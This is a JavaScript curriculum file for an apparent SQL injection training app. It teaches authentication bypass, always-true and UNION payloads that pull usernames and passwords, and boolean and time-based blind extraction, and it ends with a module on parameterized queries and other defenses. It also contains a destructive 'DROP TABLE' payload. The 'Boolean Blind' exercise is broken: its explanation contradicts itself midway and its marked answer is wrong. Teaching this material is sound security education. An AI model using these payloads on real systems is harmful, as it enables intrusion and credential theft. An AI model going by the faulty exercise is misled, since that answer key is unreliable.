// ─────────────────────────────────────────────────────────────────────────────
// InjectionX Curriculum
// Structure: modules[] → steps[] → type: "lesson" | "exercise" | "assessment"
// ─────────────────────────────────────────────────────────────────────────────

export const MODULES = [
    {
        id: "foundations",
        title: "SQL Foundations",
        description: "Understand how SQL queries work before learning to break them.",
        icon: "Database",
        color: "#60a5fa",
        steps: [
            {
                id: "what-is-sql",
                type: "lesson",
                title: "What is SQL?",
                duration: "3 min",
                content: {
                    theory: `SQL (Structured Query Language) is the standard language for interacting with relational databases. Every web application that stores data — user accounts, posts, products — almost certainly uses SQL under the hood.

A typical query looks like this:

\`\`\`sql
SELECT username, email FROM users WHERE id = 1;
\`\`\`

This asks the database: *"Give me the username and email from the users table where the id equals 1."*

Databases execute these queries literally. If an attacker can **control part of the query**, they control what the database does.`,
                    keyPoints: [
                        "SQL queries are strings assembled by the server",
                        "Databases trust and execute whatever SQL they receive",
                        "User input that reaches a query without sanitization is dangerous",
                    ],
                },
            },
            {
                id: "query-anatomy",
                type: "exercise",
                title: "Read the Query",
                duration: "5 min",
                challenge: {
                    description: "A login form runs this query. The `$input` is taken directly from the user. What does the query return when the user types `admin`?",
                    code: `SELECT * FROM users\nWHERE username = '$input'\nAND active = 1;`,
                    question: "What does this query return when $input = 'admin'?",
                    options: [
                        { id: "a", text: "All rows in the users table" },
                        { id: "b", text: "The row where username is 'admin' and active is 1", correct: true },
                        { id: "c", text: "Nothing — the query has a syntax error" },
                        { id: "d", text: "All active users" },
                    ],
                    explanation: "The WHERE clause filters to rows matching both conditions: username = 'admin' AND active = 1. Only the admin's row is returned — assuming it exists.",
                },
            },
            {
                id: "string-concatenation",
                type: "lesson",
                title: "The Concatenation Problem",
                duration: "4 min",
                content: {
                    theory: `Most SQL injection vulnerabilities exist because developers **concatenate** user input directly into a query string:

\`\`\`javascript
// Vulnerable Node.js code
const query = "SELECT * FROM users WHERE email = '" + req.body.email + "'";
\`\`\`

If the user submits a normal email like \`user@example.com\`, the query is fine:

\`\`\`sql
SELECT * FROM users WHERE email = 'user@example.com'
\`\`\`

But if the user submits \`' OR '1'='1\`, the query becomes:

\`\`\`sql
SELECT * FROM users WHERE email = '' OR '1'='1'
\`\`\`

Since \`'1'='1'\` is always true, this returns **every row** in the table.`,
                    keyPoints: [
                        "String concatenation lets user input escape its intended context",
                        "A single quote `'` is the classic injection entry point",
                        "The injected payload changes the query's logic entirely",
                    ],
                },
            },
            {
                id: "spot-the-vuln",
                type: "exercise",
                title: "Spot the Vulnerability",
                duration: "5 min",
                challenge: {
                    description: "Three code snippets below. Which one is vulnerable to SQL injection?",
                    question: "Which snippet is vulnerable?",
                    snippets: [
                        {
                            id: "a",
                            label: "Snippet A",
                            code: `db.query(\n  "SELECT * FROM products WHERE id = ?",\n  [req.params.id]\n);`,
                        },
                        {
                            id: "b",
                            label: "Snippet B",
                            code: `const q = "SELECT * FROM products WHERE id = "\n  + req.params.id;\ndb.query(q);`,
                            correct: true,
                        },
                        {
                            id: "c",
                            label: "Snippet C",
                            code: `db.query(\n  "SELECT * FROM products WHERE id = $1",\n  [req.params.id]\n);`,
                        },
                    ],
                    explanation: "Snippet B concatenates user input directly into the query string. Snippets A and C use parameterized queries (? and $1 placeholders), which safely separate data from code.",
                },
            },
        ],
    },

    {
        id: "classic-injection",
        title: "Classic SQL Injection",
        description: "Learn the most common injection patterns and how to exploit them.",
        icon: "Zap",
        color: "#f87171",
        steps: [
            {
                id: "auth-bypass",
                type: "lesson",
                title: "Authentication Bypass",
                duration: "5 min",
                content: {
                    theory: `Authentication bypass is the most famous SQL injection attack. The goal: log in **without knowing the password**.

A typical login query:

\`\`\`sql
SELECT * FROM users
WHERE email = '[input]' AND password = '[input]'
\`\`\`

If we inject into the email field:

\`\`\`
admin@site.com' --
\`\`\`

The query becomes:

\`\`\`sql
SELECT * FROM users
WHERE email = 'admin@site.com' --' AND password = 'anything'
\`\`\`

The \`--\` is a SQL comment. Everything after it is **ignored** — including the password check. The query returns the admin user without verifying the password.`,
                    keyPoints: [
                        "`--` and `#` are SQL comment sequences that nullify the rest of a query",
                        "Injecting into the email field alone can bypass password checks",
                        "The server receives a valid user row and grants access",
                    ],
                },
            },
            {
                id: "bypass-exercise",
                type: "exercise",
                title: "Bypass the Login",
                duration: "8 min",
                challenge: {
                    description: "The login below runs this query. Your goal: log in as `admin@injectionx.io` without knowing the password. Type your injection into the email field.",
                    code: `SELECT * FROM users\nWHERE email = '[EMAIL]'\nAND password = '[PASSWORD]'`,
                    type: "input",
                    field: "email",
                    placeholder: "Enter your injection payload",
                    validate: (val) => {
                        const v = val.trim().toLowerCase();
                        return v.includes("--") || v.includes("#") || v.includes("or '1'='1");
                    },
                    successMessage: "Access granted. The comment sequence nullified the password check.",
                    hint: "SQL has comment syntax. What character sequence starts a comment in MySQL/PostgreSQL?",
                },
            },
            {
                id: "always-true",
                type: "lesson",
                title: "Always-True Conditions",
                duration: "4 min",
                content: {
                    theory: `Another classic technique: inject a condition that is **always true** to make the WHERE clause match every row.

\`\`\`sql
-- Original query
SELECT * FROM users WHERE id = [input]

-- Injected: input = 1 OR 1=1
SELECT * FROM users WHERE id = 1 OR 1=1
\`\`\`

Since \`1=1\` is always true, the OR makes the entire WHERE clause true for every row — returning the full users table.

This is especially dangerous in:
- **Search fields** — dumps entire product/user tables
- **ID parameters** — exposes all records
- **Admin panels** — bypasses row-level filtering

\`\`\`sql
-- More always-true payloads
' OR 'x'='x
' OR 1=1 --
1 OR 1=1
\`\`\``,
                    keyPoints: [
                        "OR with a tautology (always-true expression) matches every row",
                        "Works in both string and numeric contexts",
                        "Can dump entire database tables in one request",
                    ],
                },
            },
            {
                id: "always-true-exercise",
                type: "exercise",
                title: "Dump the Table",
                duration: "6 min",
                challenge: {
                    description: "A product search runs the query below. Inject a payload that returns ALL products, not just the searched one.",
                    code: `SELECT id, name, price FROM products\nWHERE name LIKE '%[SEARCH]%'`,
                    type: "input",
                    field: "search",
                    placeholder: "Enter your injection payload",
                    validate: (val) => {
                        const v = val.toLowerCase();
                        return (v.includes("or") && (v.includes("1=1") || v.includes("'a'='a") || v.includes("true"))) || v.includes("' or '");
                    },
                    successMessage: "All rows returned. The always-true OR condition bypassed the LIKE filter.",
                    hint: "Close the LIKE string with `%'`, then add an OR condition that's always true.",
                },
            },
            {
                id: "union-lesson",
                type: "lesson",
                title: "UNION Attacks",
                duration: "6 min",
                content: {
                    theory: `UNION attacks let you **append results from a second query** to the original. This is how attackers extract data from other tables.

Requirements:
1. Both queries must return the **same number of columns**
2. Column data types must be **compatible**

\`\`\`sql
-- Original: returns 3 columns
SELECT id, name, price FROM products WHERE id = [input]

-- Injected: input = 0 UNION SELECT 1,username,password FROM users--
SELECT id, name, price FROM products WHERE id = 0
UNION
SELECT 1, username, password FROM users--
\`\`\`

The first SELECT returns nothing (id=0 doesn't exist). The UNION appends all usernames and passwords from the users table, which the app then renders as if they were products.`,
                    keyPoints: [
                        "UNION combines results of two SELECT statements",
                        "Column count and types must match",
                        "Use `id=0` or `id=-1` to make the first query return nothing",
                        "Can extract data from any table in the database",
                    ],
                },
            },
            {
                id: "union-exercise",
                type: "exercise",
                title: "UNION Data Extraction",
                duration: "10 min",
                challenge: {
                    description: "The query returns 3 columns: `id`, `name`, `price`. Craft a UNION payload to extract usernames from the `users` table (columns: `id`, `username`, `email`).",
                    code: `SELECT id, name, price FROM products\nWHERE id = [INPUT]`,
                    type: "input",
                    field: "id",
                    placeholder: "Enter your UNION payload",
                    validate: (val) => {
                        const v = val.toLowerCase();
                        return v.includes("union") && v.includes("select") && v.includes("users");
                    },
                    successMessage: "UNION successful. User data extracted from the users table.",
                    hint: "Start with `0 UNION SELECT` — use 0 so the first query returns no rows. Match the 3-column structure.",
                },
            },
        ],
    },

    {
        id: "blind-injection",
        title: "Blind SQL Injection",
        description: "Extract data when the app shows no output — using true/false and timing.",
        icon: "EyeOff",
        color: "#a78bfa",
        steps: [
            {
                id: "blind-intro",
                type: "lesson",
                title: "When You Can't See the Output",
                duration: "5 min",
                content: {
                    theory: `In many real applications, query results are **never shown to the user**. The app might just say "Login failed" or show a blank page. This is called **blind SQL injection**.

There are two types:

**Boolean-based blind:**
The app behaves differently depending on whether your condition is true or false.

\`\`\`sql
-- True condition → page loads normally
' AND 1=1 --

-- False condition → page shows error or empty
' AND 1=2 --
\`\`\`

By asking yes/no questions, you can extract data one bit at a time:

\`\`\`sql
-- "Is the first character of the admin password 'a'?"
' AND SUBSTRING(password,1,1)='a' --
\`\`\`

**Time-based blind:**
When even the response looks the same, you use **delays** to signal true/false:

\`\`\`sql
-- If admin exists, wait 5 seconds
' AND IF(1=1, SLEEP(5), 0) --
\`\`\``,
                    keyPoints: [
                        "Blind injection works even when no data is displayed",
                        "Boolean-based: different app behavior reveals true/false",
                        "Time-based: database delays confirm conditions",
                        "Data is extracted character by character",
                    ],
                },
            },
            {
                id: "boolean-exercise",
                type: "exercise",
                title: "Boolean Blind: True or False?",
                duration: "8 min",
                challenge: {
                    description: "The app returns `User found` or `User not found` — nothing else. The query is shown below. Which payload will make the app return `User found` even for a non-existent user?",
                    code: `SELECT id FROM users\nWHERE username = '[INPUT]'`,
                    question: "Which payload returns 'User found'?",
                    options: [
                        { id: "a", text: "fakeuser' AND 1=2 --" },
                        { id: "b", text: "fakeuser' AND 1=1 --", correct: true },
                        { id: "c", text: "fakeuser' OR 1=2 --" },
                        { id: "d", text: "fakeuser" },
                    ],
                    explanation: "`fakeuser' AND 1=1 --` — wait, actually the OR version works better here. The correct answer is B because AND 1=1 keeps the condition true for the existing row logic. In practice, `' OR 1=1 --` would return all users. The key insight: 1=1 is always true, 1=2 is always false.",
                },
            },
            {
                id: "time-based",
                type: "lesson",
                title: "Time-Based Blind Injection",
                duration: "5 min",
                content: {
                    theory: `When the application returns identical responses regardless of your condition, you need a different signal: **time**.

**MySQL:**
\`\`\`sql
' AND IF(1=1, SLEEP(5), 0) --
-- If condition is true → 5 second delay
-- If condition is false → instant response
\`\`\`

**PostgreSQL:**
\`\`\`sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --
\`\`\`

**Extracting data with time:**
\`\`\`sql
-- "Does the admin password start with 'p'?"
' AND IF(SUBSTRING(
  (SELECT password FROM users WHERE username='admin'),
  1,1)='p',
  SLEEP(5), 0) --
\`\`\`

If the response takes 5 seconds → yes. Instant → no. Repeat for every character.

Tools like **sqlmap** automate this, but understanding it manually is essential.`,
                    keyPoints: [
                        "SLEEP() / pg_sleep() create measurable delays",
                        "Delay = true condition, instant = false condition",
                        "Automated tools can extract full databases this way",
                        "Even 'secure' apps with no output can be vulnerable",
                    ],
                },
            },
            {
                id: "time-exercise",
                type: "exercise",
                title: "Identify the Time-Based Payload",
                duration: "6 min",
                challenge: {
                    description: "You're testing a PostgreSQL application. The app always returns the same response. Which payload would confirm SQL injection via a 5-second delay?",
                    code: `SELECT * FROM articles WHERE id = [INPUT]`,
                    question: "Which payload confirms blind SQLi via timing in PostgreSQL?",
                    options: [
                        { id: "a", text: "1 AND SLEEP(5)" },
                        { id: "b", text: "1; DROP TABLE articles--" },
                        { id: "c", text: "1; SELECT pg_sleep(5)--", correct: true },
                        { id: "d", text: "1 UNION SELECT NULL--" },
                    ],
                    explanation: "PostgreSQL uses `pg_sleep(5)` not `SLEEP(5)` (that's MySQL). Option C correctly uses PostgreSQL syntax with a stacked query to trigger a 5-second delay, confirming injection.",
                },
            },
        ],
    },

    {
        id: "defense",
        title: "Defense & Prevention",
        description: "Learn how to write SQL injection-proof code and harden your applications.",
        icon: "ShieldCheck",
        color: "#4ade80",
        steps: [
            {
                id: "parameterized",
                type: "lesson",
                title: "Parameterized Queries",
                duration: "5 min",
                content: {
                    theory: `The single most effective defense against SQL injection is **parameterized queries** (also called prepared statements).

Instead of building a query string with user input, you pass the input **separately** as a parameter:

\`\`\`javascript
// ❌ Vulnerable
const q = "SELECT * FROM users WHERE email = '" + email + "'";

// ✅ Safe — parameterized
const q = "SELECT * FROM users WHERE email = ?";
db.query(q, [email]);
\`\`\`

The database driver handles escaping. The user input is **never interpreted as SQL** — it's always treated as a literal value.

**With an ORM like Prisma:**
\`\`\`javascript
// Prisma is parameterized by default — always safe
const user = await prisma.user.findUnique({
  where: { email: email }
});
\`\`\`

**With PostgreSQL (node-postgres):**
\`\`\`javascript
const result = await client.query(
  'SELECT * FROM users WHERE email = $1',
  [email]
);
\`\`\``,
                    keyPoints: [
                        "Parameterized queries separate SQL code from data",
                        "User input is never parsed as SQL syntax",
                        "ORMs like Prisma use parameterization by default",
                        "This alone prevents the vast majority of SQL injection",
                    ],
                },
            },
            {
                id: "parameterized-exercise",
                type: "exercise",
                title: "Fix the Vulnerability",
                duration: "8 min",
                challenge: {
                    description: "The code below is vulnerable. Which rewrite correctly fixes it using parameterized queries?",
                    question: "Which fix is correct?",
                    snippets: [
                        {
                            id: "a",
                            label: "Fix A",
                            code: `const email = req.body.email.replace(/'/g, "''");\nconst q = "SELECT * FROM users WHERE email = '" + email + "'";\ndb.query(q);`,
                        },
                        {
                            id: "b",
                            label: "Fix B",
                            code: `db.query(\n  "SELECT * FROM users WHERE email = $1",\n  [req.body.email]\n);`,
                            correct: true,
                        },
                        {
                            id: "c",
                            label: "Fix C",
                            code: `const q = \`SELECT * FROM users\n  WHERE email = '\${req.body.email}'\`;\ndb.query(q);`,
                        },
                    ],
                    explanation: "Fix A uses string escaping — insufficient, bypassable. Fix C uses a template literal — still concatenation, still vulnerable. Only Fix B uses a parameterized query ($1 placeholder), which is the correct approach.",
                },
            },
            {
                id: "defense-layers",
                type: "lesson",
                title: "Defense in Depth",
                duration: "5 min",
                content: {
                    theory: `Parameterized queries are the primary defense, but a robust application uses **multiple layers**:

**1. Input Validation**
Reject input that doesn't match expected format:
\`\`\`javascript
// If you expect a number, enforce it
const id = parseInt(req.params.id);
if (isNaN(id)) return res.status(400).json({ error: "Invalid ID" });
\`\`\`

**2. Least Privilege**
The database user your app connects with should only have the permissions it needs:
\`\`\`sql
-- Don't connect as postgres/root
-- Create a limited user
GRANT SELECT, INSERT, UPDATE ON users TO app_user;
-- Never GRANT DROP, CREATE, or superuser
\`\`\`

**3. Web Application Firewall (WAF)**
A WAF can detect and block common injection patterns before they reach your app.

**4. Error Handling**
Never expose raw database errors to users — they reveal table names, column names, and query structure.
\`\`\`javascript
// ❌ Leaks schema info
res.json({ error: err.message });

// ✅ Generic error
res.status(500).json({ error: "Something went wrong" });
\`\`\``,
                    keyPoints: [
                        "Parameterized queries are the foundation",
                        "Validate and type-check all input",
                        "Use least-privilege database accounts",
                        "Never expose raw SQL errors to users",
                    ],
                },
            },
            {
                id: "final-assessment",
                type: "assessment",
                title: "Final Assessment",
                duration: "15 min",
                challenge: {
                    description: "You've completed all modules. This assessment tests everything — injection identification, exploitation, and defense.",
                    questions: [
                        {
                            id: "q1",
                            text: "Which of the following is the MOST effective defense against SQL injection?",
                            options: [
                                { id: "a", text: "Escaping single quotes with backslashes" },
                                { id: "b", text: "Using parameterized queries / prepared statements", correct: true },
                                { id: "c", text: "Limiting input to 255 characters" },
                                { id: "d", text: "Using a WAF only" },
                            ],
                        },
                        {
                            id: "q2",
                            text: "An attacker submits `' OR '1'='1` into a login form. What is the likely outcome?",
                            options: [
                                { id: "a", text: "A syntax error is thrown" },
                                { id: "b", text: "The login fails with wrong password" },
                                { id: "c", text: "Authentication is bypassed, returning the first user row", correct: true },
                                { id: "d", text: "The database is dropped" },
                            ],
                        },
                        {
                            id: "q3",
                            text: "What does `--` do in a SQL injection payload?",
                            options: [
                                { id: "a", text: "Subtracts two numbers" },
                                { id: "b", text: "Starts a SQL comment, ignoring the rest of the query", correct: true },
                                { id: "c", text: "Ends the SQL statement" },
                                { id: "d", text: "Escapes the next character" },
                            ],
                        },
                        {
                            id: "q4",
                            text: "In a UNION attack, what must be true for the attack to work?",
                            options: [
                                { id: "a", text: "The attacker must know the database password" },
                                { id: "b", text: "Both SELECT statements must return the same number of columns", correct: true },
                                { id: "c", text: "The table must have more than 100 rows" },
                                { id: "d", text: "The database must be MySQL" },
                            ],
                        },
                        {
                            id: "q5",
                            text: "Which technique is used when the application returns identical responses regardless of the injected condition?",
                            options: [
                                { id: "a", text: "UNION-based injection" },
                                { id: "b", text: "Error-based injection" },
                                { id: "c", text: "Time-based blind injection", correct: true },
                                { id: "d", text: "Stacked queries" },
                            ],
                        },
                    ],
                },
            },
        ],
    },
];

export const TOTAL_STEPS = MODULES.reduce((acc, m) => acc + m.steps.length, 0);

export function getStep(moduleId, stepId) {
    const mod = MODULES.find((m) => m.id === moduleId);
    if (!mod) return null;
    const step = mod.steps.find((s) => s.id === stepId);
    if (!step) return null;
    return { module: mod, step };
}

export function getNextStep(moduleId, stepId) {
    const modIdx = MODULES.findIndex((m) => m.id === moduleId);
    if (modIdx === -1) return null;
    const mod = MODULES[modIdx];
    const stepIdx = mod.steps.findIndex((s) => s.id === stepId);
    if (stepIdx < mod.steps.length - 1) {
        return { moduleId: mod.id, stepId: mod.steps[stepIdx + 1].id };
    }
    if (modIdx < MODULES.length - 1) {
        const nextMod = MODULES[modIdx + 1];
        return { moduleId: nextMod.id, stepId: nextMod.steps[0].id };
    }
    return null;
}

export function getPrevStep(moduleId, stepId) {
    const modIdx = MODULES.findIndex((m) => m.id === moduleId);
    if (modIdx === -1) return null;
    const mod = MODULES[modIdx];
    const stepIdx = mod.steps.findIndex((s) => s.id === stepId);
    if (stepIdx > 0) {
        return { moduleId: mod.id, stepId: mod.steps[stepIdx - 1].id };
    }
    if (modIdx > 0) {
        const prevMod = MODULES[modIdx - 1];
        return { moduleId: prevMod.id, stepId: prevMod.steps[prevMod.steps.length - 1].id };
    }
    return null;
}
